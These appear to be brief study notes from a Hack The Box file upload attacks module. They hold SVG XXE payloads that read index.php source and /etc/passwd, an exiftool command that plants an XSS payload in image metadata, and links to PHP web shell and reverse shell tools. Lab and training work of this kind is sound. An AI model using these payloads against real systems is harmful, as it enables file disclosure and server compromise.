https://github.com/Arrexel/phpbash
https://github.com/pentestmonkey/php-reverse-shell

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

```
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```
theo854@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
theo854@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
https://medium.com/@ZeroByte/htb-bug-bounty-hunter-certifications-skill-assessments-file-upload-attacks-walkthrough-2c2895bba6df

